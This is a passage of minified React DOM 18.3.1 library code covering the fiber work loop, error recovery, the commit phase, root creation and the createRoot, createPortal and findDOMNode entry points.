        if (((qe.transition = null), (D = 1), t)) return t();
    } finally {
        (D = r), (qe.transition = n), (M = e), !(M & 6) && tn();
    }
}
function Yl() {
    (Ie = Jn.current), q(Jn);
}
function yn(t, e) {
    (t.finishedWork = null), (t.finishedLanes = 0);
    var n = t.timeoutHandle;
    if ((n !== -1 && ((t.timeoutHandle = -1), i0(n)), te !== null))
        for (n = te.return; n !== null; ) {
            var r = n;
            switch ((Ol(r), r.tag)) {
                case 1:
                    (r = r.type.childContextTypes), r != null && xi();
                    break;
                case 3:
                    lr(), q(Te), q(xe), Fl();
                    break;
                case 5:
                    zl(r);
                    break;
                case 4:
                    lr();
                    break;
                case 13:
                    q(Q);
                    break;
                case 19:
                    q(Q);
                    break;
                case 10:
                    Ll(r.type._context);
                    break;
                case 22:
                case 23:
                    Yl();
            }
            n = n.return;
        }
    if (
        ((le = t),
        (te = t = Jt(t.current, null)),
        (ce = Ie = e),
        (oe = 0),
        (ds = null),
        (Ql = Qi = Sn = 0),
        (Ne = Vr = null),
        gn !== null)
    ) {
        for (e = 0; e < gn.length; e++)
            if (((n = gn[e]), (r = n.interleaved), r !== null)) {
                n.interleaved = null;
                var s = r.next,
                    i = n.pending;
                if (i !== null) {
                    var o = i.next;
                    (i.next = s), (r.next = o);
                }
                n.pending = r;
            }
        gn = null;
    }
    return t;
}
function of(t, e) {
    do {
        var n = te;
        try {
            if ((Al(), (ti.current = Ci), Ni)) {
                for (var r = J.memoizedState; r !== null; ) {
                    var s = r.queue;
                    s !== null && (s.pending = null), (r = r.next);
                }
                Ni = !1;
            }
            if (
                ((kn = 0),
                (ae = ie = J = null),
                (Fr = !1),
                (ls = 0),
                (Kl.current = null),
                n === null || n.return === null)
            ) {
                (oe = 1), (ds = e), (te = null);
                break;
            }
            e: {
                var i = t,
                    o = n.return,
                    a = n,
                    l = e;
                if (((e = ce), (a.flags |= 32768), l !== null && typeof l == "object" && typeof l.then == "function")) {
                    var c = l,
                        d = a,
                        h = d.tag;
                    if (!(d.mode & 1) && (h === 0 || h === 11 || h === 15)) {
                        var f = d.alternate;
                        f
                            ? ((d.updateQueue = f.updateQueue),
                              (d.memoizedState = f.memoizedState),
                              (d.lanes = f.lanes))
                            : ((d.updateQueue = null), (d.memoizedState = null));
                    }
                    var v = cc(o);
                    if (v !== null) {
                        (v.flags &= -257), dc(v, o, a, i, e), v.mode & 1 && uc(i, c, e), (e = v), (l = c);
                        var y = e.updateQueue;
                        if (y === null) {
                            var _ = new Set();
                            _.add(l), (e.updateQueue = _);
                        } else y.add(l);
                        break e;
                    } else {
                        if (!(e & 1)) {
                            uc(i, c, e), Zl();
                            break e;
                        }
                        l = Error(S(426));
                    }
                } else if (K && a.mode & 1) {
                    var b = cc(o);
                    if (b !== null) {
                        !(b.flags & 65536) && (b.flags |= 256), dc(b, o, a, i, e), $l(ur(l, a));
                        break e;
                    }
                }
                (i = l = ur(l, a)), oe !== 4 && (oe = 2), Vr === null ? (Vr = [i]) : Vr.push(i), (i = o);
                do {
                    switch (i.tag) {
                        case 3:
                            (i.flags |= 65536), (e &= -e), (i.lanes |= e);
                            var g = Bh(i, l, e);
                            rc(i, g);
                            break e;
                        case 1:
                            a = l;
                            var p = i.type,
                                m = i.stateNode;
                            if (
                                !(i.flags & 128) &&
                                (typeof p.getDerivedStateFromError == "function" ||
                                    (m !== null &&
                                        typeof m.componentDidCatch == "function" &&
                                        (Kt === null || !Kt.has(m))))
                            ) {
                                (i.flags |= 65536), (e &= -e), (i.lanes |= e);
                                var w = Vh(i, a, e);
                                rc(i, w);
                                break e;
                            }
                    }
                    i = i.return;
                } while (i !== null);
            }
            uf(n);
        } catch (k) {
            (e = k), te === n && n !== null && (te = n = n.return);
            continue;
        }
        break;
    } while (!0);
}
function af() {
    var t = Pi.current;
    return (Pi.current = Ci), t === null ? Ci : t;
}
function Zl() {
    (oe === 0 || oe === 3 || oe === 2) && (oe = 4),
        le === null || (!(Sn & 268435455) && !(Qi & 268435455)) || Mt(le, ce);
}
function Oi(t, e) {
    var n = M;
    M |= 2;
    var r = af();
    (le !== t || ce !== e) && ((gt = null), yn(t, e));
    do
        try {
            T0();
            break;
        } catch (s) {
            of(t, s);
        }
    while (!0);
    if ((Al(), (M = n), (Pi.current = r), te !== null)) throw Error(S(261));
    return (le = null), (ce = 0), oe;
}
function T0() {
    for (; te !== null; ) lf(te);
}
function R0() {
    for (; te !== null && !nm(); ) lf(te);
}
function lf(t) {
    var e = df(t.alternate, t, Ie);
    (t.memoizedProps = t.pendingProps), e === null ? uf(t) : (te = e), (Kl.current = null);
}
function uf(t) {
    var e = t;
    do {
        var n = e.alternate;
        if (((t = e.return), e.flags & 32768)) {
            if (((n = S0(n, e)), n !== null)) {
                (n.flags &= 32767), (te = n);
                return;
            }
            if (t !== null) (t.flags |= 32768), (t.subtreeFlags = 0), (t.deletions = null);
            else {
                (oe = 6), (te = null);
                return;
            }
        } else if (((n = k0(n, e, Ie)), n !== null)) {
            te = n;
            return;
        }
        if (((e = e.sibling), e !== null)) {
            te = e;
            return;
        }
        te = e = t;
    } while (e !== null);
    oe === 0 && (oe = 5);
}
function un(t, e, n) {
    var r = D,
        s = qe.transition;
    try {
        (qe.transition = null), (D = 1), O0(t, e, n, r);
    } finally {
        (qe.transition = s), (D = r);
    }
    return null;
}
function O0(t, e, n, r) {
    do nr();
    while (Ft !== null);
    if (M & 6) throw Error(S(327));
    n = t.finishedWork;
    var s = t.finishedLanes;
    if (n === null) return null;
    if (((t.finishedWork = null), (t.finishedLanes = 0), n === t.current)) throw Error(S(177));
    (t.callbackNode = null), (t.callbackPriority = 0);
    var i = n.lanes | n.childLanes;
    if (
        (hm(t, i),
        t === le && ((te = le = null), (ce = 0)),
        (!(n.subtreeFlags & 2064) && !(n.flags & 2064)) ||
            Bs ||
            ((Bs = !0),
            hf(fi, function () {
                return nr(), null;
            })),
        (i = (n.flags & 15990) !== 0),
        n.subtreeFlags & 15990 || i)
    ) {
        (i = qe.transition), (qe.transition = null);
        var o = D;
        D = 1;
        var a = M;
        (M |= 4),
            (Kl.current = null),
            E0(t, n),
            nf(n, t),
            Ym(Ea),
            (mi = !!ja),
            (Ea = ja = null),
            (t.current = n),
            N0(n),
            rm(),
            (M = a),
            (D = o),
            (qe.transition = i);
    } else t.current = n;
    if (
        (Bs && ((Bs = !1), (Ft = t), (Ri = s)),
        (i = t.pendingLanes),
        i === 0 && (Kt = null),
        om(n.stateNode),
        Oe(t, ee()),
        e !== null)
    )
        for (r = t.onRecoverableError, n = 0; n < e.length; n++)
            (s = e[n]), r(s.value, { componentStack: s.stack, digest: s.digest });
    if (Ti) throw ((Ti = !1), (t = qa), (qa = null), t);
    return (
        Ri & 1 && t.tag !== 0 && nr(),
        (i = t.pendingLanes),
        i & 1 ? (t === Ga ? Wr++ : ((Wr = 0), (Ga = t))) : (Wr = 0),
        tn(),
        null
    );
}
function nr() {
    if (Ft !== null) {
        var t = Bd(Ri),
            e = qe.transition,
            n = D;
        try {
            if (((qe.transition = null), (D = 16 > t ? 16 : t), Ft === null)) var r = !1;
            else {
                if (((t = Ft), (Ft = null), (Ri = 0), M & 6)) throw Error(S(331));
                var s = M;
                for (M |= 4, P = t.current; P !== null; ) {
                    var i = P,
                        o = i.child;
                    if (P.flags & 16) {
                        var a = i.deletions;
                        if (a !== null) {
                            for (var l = 0; l < a.length; l++) {
                                var c = a[l];
                                for (P = c; P !== null; ) {
                                    var d = P;
                                    switch (d.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            Br(8, d, i);
                                    }
                                    var h = d.child;
                                    if (h !== null) (h.return = d), (P = h);
                                    else
                                        for (; P !== null; ) {
                                            d = P;
                                            var f = d.sibling,
                                                v = d.return;
                                            if ((Zh(d), d === c)) {
                                                P = null;
                                                break;
                                            }
                                            if (f !== null) {
                                                (f.return = v), (P = f);
                                                break;
                                            }
                                            P = v;
                                        }
                                }
                            }
                            var y = i.alternate;
                            if (y !== null) {
                                var _ = y.child;
                                if (_ !== null) {
                                    y.child = null;
                                    do {
                                        var b = _.sibling;
                                        (_.sibling = null), (_ = b);
                                    } while (_ !== null);
                                }
                            }
                            P = i;
                        }
                    }
                    if (i.subtreeFlags & 2064 && o !== null) (o.return = i), (P = o);
                    else
                        e: for (; P !== null; ) {
                            if (((i = P), i.flags & 2048))
                                switch (i.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Br(9, i, i.return);
                                }
                            var g = i.sibling;
                            if (g !== null) {
                                (g.return = i.return), (P = g);
                                break e;
                            }
                            P = i.return;
                        }
                }
                var p = t.current;
                for (P = p; P !== null; ) {
                    o = P;
                    var m = o.child;
                    if (o.subtreeFlags & 2064 && m !== null) (m.return = o), (P = m);
                    else
                        e: for (o = p; P !== null; ) {
                            if (((a = P), a.flags & 2048))
                                try {
                                    switch (a.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            Ki(9, a);
                                    }
                                } catch (k) {
                                    Z(a, a.return, k);
                                }
                            if (a === o) {
                                P = null;
                                break e;
                            }
                            var w = a.sibling;
                            if (w !== null) {
                                (w.return = a.return), (P = w);
                                break e;
                            }
                            P = a.return;
                        }
                }
                if (((M = s), tn(), ht && typeof ht.onPostCommitFiberRoot == "function"))
                    try {
                        ht.onPostCommitFiberRoot(zi, t);
                    } catch {}
                r = !0;
            }
            return r;
        } finally {
            (D = n), (qe.transition = e);
        }
    }
    return !1;
}
function Sc(t, e, n) {
    (e = ur(n, e)), (e = Bh(t, e, 1)), (t = Gt(t, e, 1)), (e = ke()), t !== null && (gs(t, 1, e), Oe(t, e));
}
function Z(t, e, n) {
    if (t.tag === 3) Sc(t, t, n);
    else
        for (; e !== null; ) {
            if (e.tag === 3) {
                Sc(e, t, n);
                break;
            } else if (e.tag === 1) {
                var r = e.stateNode;
                if (
                    typeof e.type.getDerivedStateFromError == "function" ||
                    (typeof r.componentDidCatch == "function" && (Kt === null || !Kt.has(r)))
                ) {
                    (t = ur(n, t)),
                        (t = Vh(e, t, 1)),
                        (e = Gt(e, t, 1)),
                        (t = ke()),
                        e !== null && (gs(e, 1, t), Oe(e, t));
                    break;
                }
            }
            e = e.return;
        }
}
function $0(t, e, n) {
    var r = t.pingCache;
    r !== null && r.delete(e),
        (e = ke()),
        (t.pingedLanes |= t.suspendedLanes & n),
        le === t &&
            (ce & n) === n &&
            (oe === 4 || (oe === 3 && (ce & 130023424) === ce && 500 > ee() - Jl) ? yn(t, 0) : (Ql |= n)),
        Oe(t, e);
}
function cf(t, e) {
    e === 0 && (t.mode & 1 ? ((e = Os), (Os <<= 1), !(Os & 130023424) && (Os = 4194304)) : (e = 1));
    var n = ke();
    (t = St(t, e)), t !== null && (gs(t, e, n), Oe(t, n));
}
function I0(t) {
    var e = t.memoizedState,
        n = 0;
    e !== null && (n = e.retryLane), cf(t, n);
}
function A0(t, e) {
    var n = 0;
    switch (t.tag) {
        case 13:
            var r = t.stateNode,
                s = t.memoizedState;
            s !== null && (n = s.retryLane);
            break;
        case 19:
            r = t.stateNode;
            break;
        default:
            throw Error(S(314));
    }
    r !== null && r.delete(e), cf(t, n);
}
var df;
df = function (t, e, n) {
    if (t !== null)
        if (t.memoizedProps !== e.pendingProps || Te.current) Pe = !0;
        else {
            if (!(t.lanes & n) && !(e.flags & 128)) return (Pe = !1), b0(t, e, n);
            Pe = !!(t.flags & 131072);
        }
    else (Pe = !1), K && e.flags & 1048576 && ph(e, bi, e.index);
    switch (((e.lanes = 0), e.tag)) {
        case 2:
            var r = e.type;
            ri(t, e), (t = e.pendingProps);
            var s = ir(e, xe.current);
            tr(e, n), (s = Vl(null, e, r, t, s, n));
            var i = Wl();
            return (
                (e.flags |= 1),
                typeof s == "object" && s !== null && typeof s.render == "function" && s.$$typeof === void 0
                    ? ((e.tag = 1),
                      (e.memoizedState = null),
                      (e.updateQueue = null),
                      Re(r) ? ((i = !0), wi(e)) : (i = !1),
                      (e.memoizedState = s.state !== null && s.state !== void 0 ? s.state : null),
                      Ul(e),
                      (s.updater = Gi),
                      (e.stateNode = s),
                      (s._reactInternals = e),
                      Aa(e, r, t, n),
                      (e = Ua(null, e, r, !0, i, n)))
                    : ((e.tag = 0), K && i && Rl(e), be(null, e, s, n), (e = e.child)),
                e
            );
        case 16:
            r = e.elementType;
            e: {
                switch (
                    (ri(t, e),
                    (t = e.pendingProps),
                    (s = r._init),
                    (r = s(r._payload)),
                    (e.type = r),
                    (s = e.tag = M0(r)),
                    (t = Ye(r, t)),
                    s)
                ) {
                    case 0:
                        e = Ma(null, e, r, t, n);
                        break e;
                    case 1:
                        e = pc(null, e, r, t, n);
                        break e;
                    case 11:
                        e = hc(null, e, r, t, n);
                        break e;
                    case 14:
                        e = fc(null, e, r, Ye(r.type, t), n);
                        break e;
                }
                throw Error(S(306, r, ""));
            }
            return e;
        case 0:
            return (r = e.type), (s = e.pendingProps), (s = e.elementType === r ? s : Ye(r, s)), Ma(t, e, r, s, n);
        case 1:
            return (r = e.type), (s = e.pendingProps), (s = e.elementType === r ? s : Ye(r, s)), pc(t, e, r, s, n);
        case 3:
            e: {
                if ((Gh(e), t === null)) throw Error(S(387));
                (r = e.pendingProps), (i = e.memoizedState), (s = i.element), wh(t, e), ji(e, r, null, n);
                var o = e.memoizedState;
                if (((r = o.element), i.isDehydrated))
                    if (
                        ((i = {
                            element: r,
                            isDehydrated: !1,
                            cache: o.cache,
                            pendingSuspenseBoundaries: o.pendingSuspenseBoundaries,
                            transitions: o.transitions,
                        }),
                        (e.updateQueue.baseState = i),
                        (e.memoizedState = i),
                        e.flags & 256)
                    ) {
                        (s = ur(Error(S(423)), e)), (e = mc(t, e, r, n, s));
                        break e;
                    } else if (r !== s) {
                        (s = ur(Error(S(424)), e)), (e = mc(t, e, r, n, s));
                        break e;
                    } else
                        for (
                            Ae = qt(e.stateNode.containerInfo.firstChild),
                                Le = e,
                                K = !0,
                                tt = null,
                                n = yh(e, null, r, n),
                                e.child = n;
                            n;

                        )
                            (n.flags = (n.flags & -3) | 4096), (n = n.sibling);
                else {
                    if ((or(), r === s)) {
                        e = jt(t, e, n);
                        break e;
                    }
                    be(t, e, r, n);
                }
                e = e.child;
            }
            return e;
        case 5:
            return (
                _h(e),
                t === null && Oa(e),
                (r = e.type),
                (s = e.pendingProps),
                (i = t !== null ? t.memoizedProps : null),
                (o = s.children),
                Na(r, s) ? (o = null) : i !== null && Na(r, i) && (e.flags |= 32),
                qh(t, e),
                be(t, e, o, n),
                e.child
            );
        case 6:
            return t === null && Oa(e), null;
        case 13:
            return Kh(t, e, n);
        case 4:
            return (
                Dl(e, e.stateNode.containerInfo),
                (r = e.pendingProps),
                t === null ? (e.child = ar(e, null, r, n)) : be(t, e, r, n),
                e.child
            );
        case 11:
            return (r = e.type), (s = e.pendingProps), (s = e.elementType === r ? s : Ye(r, s)), hc(t, e, r, s, n);
        case 7:
            return be(t, e, e.pendingProps, n), e.child;
        case 8:
            return be(t, e, e.pendingProps.children, n), e.child;
        case 12:
            return be(t, e, e.pendingProps.children, n), e.child;
        case 10:
            e: {
                if (
                    ((r = e.type._context),
                    (s = e.pendingProps),
                    (i = e.memoizedProps),
                    (o = s.value),
                    V(ki, r._currentValue),
                    (r._currentValue = o),
                    i !== null)
                )
                    if (st(i.value, o)) {
                        if (i.children === s.children && !Te.current) {
                            e = jt(t, e, n);
                            break e;
                        }
                    } else
                        for (i = e.child, i !== null && (i.return = e); i !== null; ) {
                            var a = i.dependencies;
                            if (a !== null) {
                                o = i.child;
                                for (var l = a.firstContext; l !== null; ) {
                                    if (l.context === r) {
                                        if (i.tag === 1) {
                                            (l = _t(-1, n & -n)), (l.tag = 2);
                                            var c = i.updateQueue;
                                            if (c !== null) {
                                                c = c.shared;
                                                var d = c.pending;
                                                d === null ? (l.next = l) : ((l.next = d.next), (d.next = l)),
                                                    (c.pending = l);
                                            }
                                        }
                                        (i.lanes |= n),
                                            (l = i.alternate),
                                            l !== null && (l.lanes |= n),
                                            $a(i.return, n, e),
                                            (a.lanes |= n);
                                        break;
                                    }
                                    l = l.next;
                                }
                            } else if (i.tag === 10) o = i.type === e.type ? null : i.child;
                            else if (i.tag === 18) {
                                if (((o = i.return), o === null)) throw Error(S(341));
                                (o.lanes |= n),
                                    (a = o.alternate),
                                    a !== null && (a.lanes |= n),
                                    $a(o, n, e),
                                    (o = i.sibling);
                            } else o = i.child;
                            if (o !== null) o.return = i;
                            else
                                for (o = i; o !== null; ) {
                                    if (o === e) {
                                        o = null;
                                        break;
                                    }
                                    if (((i = o.sibling), i !== null)) {
                                        (i.return = o.return), (o = i);
                                        break;
                                    }
                                    o = o.return;
                                }
                            i = o;
                        }
                be(t, e, s.children, n), (e = e.child);
            }
            return e;
        case 9:
            return (
                (s = e.type),
                (r = e.pendingProps.children),
                tr(e, n),
                (s = Ke(s)),
                (r = r(s)),
                (e.flags |= 1),
                be(t, e, r, n),
                e.child
            );
        case 14:
            return (r = e.type), (s = Ye(r, e.pendingProps)), (s = Ye(r.type, s)), fc(t, e, r, s, n);
        case 15:
            return Wh(t, e, e.type, e.pendingProps, n);
        case 17:
            return (
                (r = e.type),
                (s = e.pendingProps),
                (s = e.elementType === r ? s : Ye(r, s)),
                ri(t, e),
                (e.tag = 1),
                Re(r) ? ((t = !0), wi(e)) : (t = !1),
                tr(e, n),
                Fh(e, r, s),
                Aa(e, r, s, n),
                Ua(null, e, r, !0, t, n)
            );
        case 19:
            return Qh(t, e, n);
        case 22:
            return Hh(t, e, n);
    }
    throw Error(S(156, e.tag));
};
function hf(t, e) {
    return Ud(t, e);
}
function L0(t, e, n, r) {
    (this.tag = t),
        (this.key = n),
        (this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null),
        (this.index = 0),
        (this.ref = null),
        (this.pendingProps = e),
        (this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null),
        (this.mode = r),
        (this.subtreeFlags = this.flags = 0),
        (this.deletions = null),
        (this.childLanes = this.lanes = 0),
        (this.alternate = null);
}
function He(t, e, n, r) {
    return new L0(t, e, n, r);
}
function eu(t) {
    return (t = t.prototype), !(!t || !t.isReactComponent);
}
function M0(t) {
    if (typeof t == "function") return eu(t) ? 1 : 0;
    if (t != null) {
        if (((t = t.$$typeof), t === xl)) return 11;
        if (t === wl) return 14;
    }
    return 2;
}
function Jt(t, e) {
    var n = t.alternate;
    return (
        n === null
            ? ((n = He(t.tag, e, t.key, t.mode)),
              (n.elementType = t.elementType),
              (n.type = t.type),
              (n.stateNode = t.stateNode),
              (n.alternate = t),
              (t.alternate = n))
            : ((n.pendingProps = e), (n.type = t.type), (n.flags = 0), (n.subtreeFlags = 0), (n.deletions = null)),
        (n.flags = t.flags & 14680064),
        (n.childLanes = t.childLanes),
        (n.lanes = t.lanes),
        (n.child = t.child),
        (n.memoizedProps = t.memoizedProps),
        (n.memoizedState = t.memoizedState),
        (n.updateQueue = t.updateQueue),
        (e = t.dependencies),
        (n.dependencies = e === null ? null : { lanes: e.lanes, firstContext: e.firstContext }),
        (n.sibling = t.sibling),
        (n.index = t.index),
        (n.ref = t.ref),
        n
    );
}
function oi(t, e, n, r, s, i) {
    var o = 2;
    if (((r = t), typeof t == "function")) eu(t) && (o = 1);
    else if (typeof t == "string") o = 5;
    else
        e: switch (t) {
            case zn:
                return xn(n.children, s, i, e);
            case yl:
                (o = 8), (s |= 8);
                break;
            case ia:
                return (t = He(12, n, e, s | 2)), (t.elementType = ia), (t.lanes = i), t;
            case oa:
                return (t = He(13, n, e, s)), (t.elementType = oa), (t.lanes = i), t;
            case aa:
                return (t = He(19, n, e, s)), (t.elementType = aa), (t.lanes = i), t;
            case _d:
                return Ji(n, s, i, e);
            default:
                if (typeof t == "object" && t !== null)
                    switch (t.$$typeof) {
                        case xd:
                            o = 10;
                            break e;
                        case wd:
                            o = 9;
                            break e;
                        case xl:
                            o = 11;
                            break e;
                        case wl:
                            o = 14;
                            break e;
                        case It:
                            (o = 16), (r = null);
                            break e;
                    }
                throw Error(S(130, t == null ? t : typeof t, ""));
        }
    return (e = He(o, n, e, s)), (e.elementType = t), (e.type = r), (e.lanes = i), e;
}
function xn(t, e, n, r) {
    return (t = He(7, t, r, e)), (t.lanes = n), t;
}
function Ji(t, e, n, r) {
    return (t = He(22, t, r, e)), (t.elementType = _d), (t.lanes = n), (t.stateNode = { isHidden: !1 }), t;
}
function Fo(t, e, n) {
    return (t = He(6, t, null, e)), (t.lanes = n), t;
}
function Bo(t, e, n) {
    return (
        (e = He(4, t.children !== null ? t.children : [], t.key, e)),
        (e.lanes = n),
        (e.stateNode = { containerInfo: t.containerInfo, pendingChildren: null, implementation: t.implementation }),
        e
    );
}
function U0(t, e, n, r, s) {
    (this.tag = e),
        (this.containerInfo = t),
        (this.finishedWork = this.pingCache = this.current = this.pendingChildren = null),
        (this.timeoutHandle = -1),
        (this.callbackNode = this.pendingContext = this.context = null),
        (this.callbackPriority = 0),
        (this.eventTimes = bo(0)),
        (this.expirationTimes = bo(-1)),
        (this.entangledLanes =
            this.finishedLanes =
            this.mutableReadLanes =
            this.expiredLanes =
            this.pingedLanes =
            this.suspendedLanes =
            this.pendingLanes =
                0),
        (this.entanglements = bo(0)),
        (this.identifierPrefix = r),
        (this.onRecoverableError = s),
        (this.mutableSourceEagerHydrationData = null);
}
function tu(t, e, n, r, s, i, o, a, l) {
    return (
        (t = new U0(t, e, n, a, l)),
        e === 1 ? ((e = 1), i === !0 && (e |= 8)) : (e = 0),
        (i = He(3, null, null, e)),
        (t.current = i),
        (i.stateNode = t),
        (i.memoizedState = {
            element: r,
            isDehydrated: n,
            cache: null,
            transitions: null,
            pendingSuspenseBoundaries: null,
        }),
        Ul(i),
        t
    );
}
function D0(t, e, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return { $$typeof: Dn, key: r == null ? null : "" + r, children: t, containerInfo: e, implementation: n };
}
function ff(t) {
    if (!t) return Yt;
    t = t._reactInternals;
    e: {
        if (Nn(t) !== t || t.tag !== 1) throw Error(S(170));
        var e = t;
        do {
            switch (e.tag) {
                case 3:
                    e = e.stateNode.context;
                    break e;
                case 1:
                    if (Re(e.type)) {
                        e = e.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e;
                    }
            }
            e = e.return;
        } while (e !== null);
        throw Error(S(171));
    }
    if (t.tag === 1) {
        var n = t.type;
        if (Re(n)) return hh(t, n, e);
    }
    return e;
}
function pf(t, e, n, r, s, i, o, a, l) {
    return (
        (t = tu(n, r, !0, t, s, i, o, a, l)),
        (t.context = ff(null)),
        (n = t.current),
        (r = ke()),
        (s = Qt(n)),
        (i = _t(r, s)),
        (i.callback = e ?? null),
        Gt(n, i, s),
        (t.current.lanes = s),
        gs(t, s, r),
        Oe(t, r),
        t
    );
}
function Xi(t, e, n, r) {
    var s = e.current,
        i = ke(),
        o = Qt(s);
    return (
        (n = ff(n)),
        e.context === null ? (e.context = n) : (e.pendingContext = n),
        (e = _t(i, o)),
        (e.payload = { element: t }),
        (r = r === void 0 ? null : r),
        r !== null && (e.callback = r),
        (t = Gt(s, e, o)),
        t !== null && (rt(t, s, o, i), ei(t, s, o)),
        o
    );
}
function $i(t) {
    if (((t = t.current), !t.child)) return null;
    switch (t.child.tag) {
        case 5:
            return t.child.stateNode;
        default:
            return t.child.stateNode;
    }
}
function jc(t, e) {
    if (((t = t.memoizedState), t !== null && t.dehydrated !== null)) {
        var n = t.retryLane;
        t.retryLane = n !== 0 && n < e ? n : e;
    }
}
function nu(t, e) {
    jc(t, e), (t = t.alternate) && jc(t, e);
}
function z0() {
    return null;
}
var mf =
    typeof reportError == "function"
        ? reportError
        : function (t) {
              console.error(t);
          };
function ru(t) {
    this._internalRoot = t;
}
Yi.prototype.render = ru.prototype.render = function (t) {
    var e = this._internalRoot;
    if (e === null) throw Error(S(409));
    Xi(t, e, null, null);
};
Yi.prototype.unmount = ru.prototype.unmount = function () {
    var t = this._internalRoot;
    if (t !== null) {
        this._internalRoot = null;
        var e = t.containerInfo;
        jn(function () {
            Xi(null, t, null, null);
        }),
            (e[kt] = null);
    }
};
function Yi(t) {
    this._internalRoot = t;
}
Yi.prototype.unstable_scheduleHydration = function (t) {
    if (t) {
        var e = Hd();
        t = { blockedOn: null, target: t, priority: e };
        for (var n = 0; n < Lt.length && e !== 0 && e < Lt[n].priority; n++);
        Lt.splice(n, 0, t), n === 0 && Gd(t);
    }
};
function su(t) {
    return !(!t || (t.nodeType !== 1 && t.nodeType !== 9 && t.nodeType !== 11));
}
function Zi(t) {
    return !(
        !t ||
        (t.nodeType !== 1 &&
            t.nodeType !== 9 &&
            t.nodeType !== 11 &&
            (t.nodeType !== 8 || t.nodeValue !== " react-mount-point-unstable "))
    );
}
function Ec() {}
function F0(t, e, n, r, s) {
    if (s) {
        if (typeof r == "function") {
            var i = r;
            r = function () {
                var c = $i(o);
                i.call(c);
            };
        }
        var o = pf(e, r, t, 0, null, !1, !1, "", Ec);
        return (t._reactRootContainer = o), (t[kt] = o.current), rs(t.nodeType === 8 ? t.parentNode : t), jn(), o;
    }
    for (; (s = t.lastChild); ) t.removeChild(s);
    if (typeof r == "function") {
        var a = r;
        r = function () {
            var c = $i(l);
            a.call(c);
        };
    }
    var l = tu(t, 0, !1, null, null, !1, !1, "", Ec);
    return (
        (t._reactRootContainer = l),
        (t[kt] = l.current),
        rs(t.nodeType === 8 ? t.parentNode : t),
        jn(function () {
            Xi(e, l, n, r);
        }),
        l
    );
}
function eo(t, e, n, r, s) {
    var i = n._reactRootContainer;
    if (i) {
        var o = i;
        if (typeof s == "function") {
            var a = s;
            s = function () {
                var l = $i(o);
                a.call(l);
            };
        }
        Xi(e, o, t, s);
    } else o = F0(n, e, t, s, r);
    return $i(o);
}
Vd = function (t) {
    switch (t.tag) {
        case 3:
            var e = t.stateNode;
            if (e.current.memoizedState.isDehydrated) {
                var n = $r(e.pendingLanes);
                n !== 0 && (kl(e, n | 1), Oe(e, ee()), !(M & 6) && ((cr = ee() + 500), tn()));
            }
            break;
        case 13:
            jn(function () {
                var r = St(t, 1);
                if (r !== null) {
                    var s = ke();
                    rt(r, t, 1, s);
                }
            }),
                nu(t, 1);
    }
};
Sl = function (t) {
    if (t.tag === 13) {
        var e = St(t, 134217728);
        if (e !== null) {
            var n = ke();
            rt(e, t, 134217728, n);
        }
        nu(t, 134217728);
    }
};
Wd = function (t) {
    if (t.tag === 13) {
        var e = Qt(t),
            n = St(t, e);
        if (n !== null) {
            var r = ke();
            rt(n, t, e, r);
        }
        nu(t, e);
    }
};
Hd = function () {
    return D;
};
qd = function (t, e) {
    var n = D;
    try {
        return (D = t), e();
    } finally {
        D = n;
    }
};
va = function (t, e, n) {
    switch (e) {
        case "input":
            if ((ca(t, n), (e = n.name), n.type === "radio" && e != null)) {
                for (n = t; n.parentNode; ) n = n.parentNode;
                for (
                    n = n.querySelectorAll("input[name=" + JSON.stringify("" + e) + '][type="radio"]'), e = 0;
                    e < n.length;
                    e++
                ) {
                    var r = n[e];
                    if (r !== t && r.form === t.form) {
                        var s = Wi(r);
                        if (!s) throw Error(S(90));
                        kd(r), ca(r, s);
                    }
                }
            }
            break;
        case "textarea":
            jd(t, n);
            break;
        case "select":
            (e = n.value), e != null && Xn(t, !!n.multiple, e, !1);
    }
};
Od = Xl;
$d = jn;
var B0 = { usingClientEntryPoint: !1, Events: [ys, Wn, Wi, Td, Rd, Xl] },
    Cr = { findFiberByHostInstance: mn, bundleType: 0, version: "18.3.1", rendererPackageName: "react-dom" },
    V0 = {
        bundleType: Cr.bundleType,
        version: Cr.version,
        rendererPackageName: Cr.rendererPackageName,
        rendererConfig: Cr.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: Et.ReactCurrentDispatcher,
        findHostInstanceByFiber: function (t) {
            return (t = Ld(t)), t === null ? null : t.stateNode;
        },
        findFiberByHostInstance: Cr.findFiberByHostInstance || z0,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.3.1-next-f1338f8080-20240426",
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Vs = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Vs.isDisabled && Vs.supportsFiber)
        try {
            (zi = Vs.inject(V0)), (ht = Vs);
        } catch {}
}
Ue.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = B0;
Ue.createPortal = function (t, e) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!su(e)) throw Error(S(200));
    return D0(t, e, null, n);
};
Ue.createRoot = function (t, e) {
    if (!su(t)) throw Error(S(299));
    var n = !1,
        r = "",
        s = mf;
    return (
        e != null &&
            (e.unstable_strictMode === !0 && (n = !0),
            e.identifierPrefix !== void 0 && (r = e.identifierPrefix),
            e.onRecoverableError !== void 0 && (s = e.onRecoverableError)),
        (e = tu(t, 1, !1, null, null, n, !1, r, s)),
        (t[kt] = e.current),
        rs(t.nodeType === 8 ? t.parentNode : t),
        new ru(e)
    );
};
Ue.findDOMNode = function (t) {
    if (t == null) return null;
    if (t.nodeType === 1) return t;
    var e = t._reactInternals;
    if (e === void 0)
        throw typeof t.render == "function" ? Error(S(188)) : ((t = Object.keys(t).join(",")), Error(S(268, t)));
    return (t = Ld(e)), (t = t === null ? null : t.stateNode), t;
};
Ue.flushSync = function (t) {
    return jn(t);
